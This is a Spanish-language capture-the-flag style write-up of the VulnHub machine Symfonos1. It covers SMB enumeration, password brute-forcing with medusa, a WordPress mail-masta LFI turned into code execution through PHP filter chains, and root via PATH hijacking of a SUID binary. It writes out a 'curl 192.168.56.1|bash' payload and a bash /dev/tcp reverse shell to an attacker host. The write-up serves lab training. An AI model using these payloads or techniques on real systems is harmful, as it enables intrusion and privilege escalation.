---
layout: single
title: Symfonos1 - VulnHub
excerpt: "Symfonos 1 es una máquina que contempla una vulnerabilidad llamada LFI(Local File Inclusion) que nos permite ganar acceso remoto a la máquina. Luego la escalada de privilegios es directamente a root por una mala configuración de permisos de archivos y una forma incorrecta de llamar al archivo \"curl\"."
date: 2023-11-02
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub 
  - cxdxnt
tags:  
  - suid
  - rpcbind
  - mount
---
![](/assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png)


Symfonos 1 es una máquina que contempla una vulnerabilidad llamada LFI(Local File Inclusion) que nos permite ganar acceso remoto a la máquina. Luego la escalada de privilegios es directamente a root por una mala configuraciónde permisos de archivos y una forma incorrecta de llamar al archivo "curl".


## Enumeración

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar varios servicios.

```python
# Nmap 7.93 scan initiated Mon Oct 30 07:39:39 2023 as: nmap -sCV -p22,25,80,139,445 -oN scanvuln.nmap 192.168.56.13
Nmap scan report for 192.168.56.13
Host is up (0.00032s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab5b45a70547a50445ca6f18bd1803c2 (RSA)
|   256 a05f400a0a1f68353ef45407619fc64a (ECDSA)
|_  256 bc31f540bc08584bfb6617ff8412ac1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:6F:15:D8 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h20m01s, deviation: 2h53m12s, median: -3h00m01s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2023-10-30T02:39:50-05:00
| smb2-time: 
|   date: 2023-10-30T07:39:50
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 30 07:39:52 2023 -- 1 IP address (1 host up) scanned in 12.68 seconds
```

## Analisis 

El comienzo de la enumeración va a ser dirigido a través del servicio SAMBA, a la hora de listar los directorios observamos que uno de ellos contiene el nombre de un usuario del sistema.Para aclarar, también permite iniciar sesión como un usuario nulo.

![](/assets/images/vulnhub-writeup-symfonos1/sambaDirectorios.png)

Al ingresar y listar el único archivo que se presenta, nos informa que hay 3 contraseñas típicas que los usuarios están utilizando.


![](/assets/images/vulnhub-writeup-symfonos1/archivosSamba.png)

Utilizaremos "medusa" para ejercer fuerza bruta al usuario "helios" con las 3 contraseñas que nos indican.


```bash
➜  data medusa -M smbnt  -u helios -P password.txt -h 192.168.56.13 -v 4
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT FOUND: [smbnt] Host: 192.168.56.13 User: helios Password: qwerty [SUCCESS (ADMIN$ - Share Unavailable)]
```

Con las credenciales del usuario "helios" podemos ingresar al directorio "helios" del servicio SAMBA. Que nos informa de una ruta del sistema.

![](/assets/images/vulnhub-writeup-symfonos1/listarDirectorios.png)

### Wordpress

Al ingresar al directorio "/h3l105" podemos analizar que se trata de un sistema de gestión de contenidos llamada WordPress, por lo que procedo a enumerar plugins y encuentro algunos interesantes.

```bash

➜  data ffuf -w ../../scripts/plugins.txt -u http://symfonos.local/h3l105/wp-content/plugins/FUZZ -t 100 -c  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://symfonos.local/h3l105/wp-content/plugins/FUZZ
 :: Wordlist         : FUZZ: ../../scripts/plugins.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

akismet                 [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 0ms]
mail-masta              [Status: 301, Size: 347, Words: 20, Lines: 10, Duration: 7ms]
site-editor             [Status: 301, Size: 348, Words: 20, Lines: 10, Duration: 0ms]
:: Progress: [80086/80086] :: Job [1/1] :: 3659 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```

"mail-casta" y "site-editor" son vulnerables a Local File Inclusion(LFI). Pero solamente "mail-casta" nos deja interactuar con wrappers. Por lo que utilizaré "php_filter_chain_generator" que genera una especie de cadenas de filtros php para obtener un RCE.



```bash

➜  exploits git clone https://github.com/synacktiv/php_filter_chain_generator
Clonando en 'php_filter_chain_generator'...
remote: Enumerating objects: 11, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 11 (delta 4), reused 10 (delta 4), pack-reused 0
Recibiendo objetos: 100% (11/11), 5.23 KiB | 5.23 MiB/s, listo.
Resolviendo deltas: 100% (4/4), listo.
➜  exploits cd php_filter_chain_generator 
➜  php_filter_chain_generator git:(main) python3 php_filter_chain_generator.py --chain "<?php system('curl 192.168.56.1|bash');?>"
➜  php_filter_chain_generator git:(main) cat index.html
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.1/443 0>&1
```

El contenido generado por la herramienta lo ponemos en el parámetro pl, y nos ponemos en escucha con python3 -m http-server 80 para que pueda tomar el archivo index.html. Sin olvidar de ponernos en escucha en el puerto 443 con nc.
```bash

http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=<Cadena de filtros PHP generado>.

```

## Shell - helios

Al ganar acceso remoto a la máquina procedemos a enumerar archivos SUID. Observamos que hay un archivo que llama la atención.

```bash
helios@symfonos:/dev/shm$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping
```

Al analizar con strings el archivo statuscheck observamos que está llamando incorrectamente al programa curl, por lo que podemos llegar a realizar un ataque llamado Path Hijacking.

```bash

helios@symfonos:/dev/shm$ strings /opt/statuscheck 
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
http://lH
ocalhostH
AWAVA
AUATL
[]A\A]A^A_
;*3$"
```

Procedemos a inicializar el ataque de la siguiente manera.

```bash

helios@symfonos:/dev/shm$ export PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
helios@symfonos:/dev/shm$ cat curl 
/bin/sh
helios@symfonos:/dev/shm$ /opt/statuscheck 
# whoami
root
```
